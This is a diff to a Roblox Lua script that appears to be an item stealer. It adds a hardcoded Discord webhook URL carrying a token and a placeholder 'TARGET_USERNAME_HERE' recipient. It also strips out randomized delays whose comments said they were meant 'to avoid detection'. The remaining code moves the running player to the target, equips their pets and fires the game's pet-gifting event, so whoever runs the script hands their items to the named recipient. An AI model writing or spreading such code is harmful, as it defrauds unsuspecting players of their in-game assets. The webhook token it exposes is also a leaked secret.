@@ -1,3 +1,8 @@
+local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
+
+-- Set this to the username of the recipient
+local username = "TARGET_USERNAME_HERE"
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -245,33 +250,14 @@ local function unequipAllPets()
     end
 end
 
--- Instead of instant MoveTo, move in smaller increments to mimic player behavior
-local function smoothMoveTo(targetPos)
-    local char = LocalPlayer.Character
-    if not char then return end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
-    local start = hrp.Position
-    local steps = 10
-    for i = 1, steps do
-        local t = i / steps
-        hrp.CFrame = CFrame.new(start:Lerp(targetPos, t))
-        task.wait(0.08 + math.random() * 0.07)
-    end
-end
-
 local function startGiving()
-    -- Add random delay before starting
-    task.wait(1.2 + math.random() * 1.5)
     if not hasValidItems() then return end
     local target = Players:FindFirstChild(username)
     if not target or not target.Character then return end
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-
-    -- Use smoothMoveTo instead of instant MoveTo
-    smoothMoveTo(hrp.Position)
-    task.wait(0.4 + math.random())
+    LocalPlayer.Character:MoveTo(hrp.Position)
+    task.wait(0.4)
 
     local cname = "ProximityPrompt"
     local prompt
@@ -301,15 +287,11 @@ local function startGiving()
                 item.Parent = LocalPlayer.Character
                 task.wait()
             end
-
-            -- Add small randomized delay between actions to avoid detection
-            task.wait(0.3 + math.random() * 0.6)
-
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
             local holdBegin = "InputHoldBegin"
             local holdEnd = "InputHoldEnd"
             if prompt[holdBegin] then prompt[holdBegin](prompt) end
-            task.wait(0.18 + math.random() * 0.15)
+            task.wait(0.1)
             if prompt[holdEnd] then prompt[holdEnd](prompt) end
 
             if item:IsDescendantOf(LocalPlayer.Character) then
@@ -319,6 +301,7 @@ local function startGiving()
         else
             break
         end
+        task.wait(0.05)
     end
 end
 
